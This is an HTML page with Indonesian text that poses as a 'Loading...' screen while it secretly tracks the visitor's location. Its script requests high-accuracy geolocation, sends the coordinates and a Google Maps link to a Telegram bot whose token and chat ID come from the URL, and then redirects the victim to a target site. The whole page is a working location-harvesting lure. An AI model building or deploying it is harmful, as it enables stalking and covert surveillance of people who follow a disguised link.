<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background: #000; 
            color: #fff; 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding-top: 50px;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h2>Memuat...</h2>
    <div class="loader"></div>

    <script>
        function getParam(name) {
            return new URLSearchParams(window.location.search).get(name);
        }

        const target = decodeURIComponent(getParam("target") || "");
        const token = getParam("token");
        const chatid = getParam("chatid");

        if (!token || !chatid || !target) {
            document.body.innerHTML = "<h3>Parameter tidak lengkap.</h3>";
        } else {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout: 10000 });
            } else {
                sendToTelegram("Geolocation tidak didukung browser ini.");
                redirect();
            }
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            const message = `📍 Lokasi Terdeteksi:\nLatitude: ${lat}\nLongitude: ${lon}\nAkurasi: ${acc} meter\n🌐 Google Maps: https://www.google.com/maps?q=${lat},${lon}`;

            sendToTelegram(message);
            setTimeout(redirect, 1500);
        }

        function error(err) {
            sendToTelegram(`Gagal mendapatkan lokasi: ${err.message}`);
            redirect();
        }

        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatid, text: msg })
            }).catch(e => console.error("Gagal kirim ke Telegram", e));
        }

        function redirect() {
            window.location.href = target;
        }
    </script>
</body>
</html>
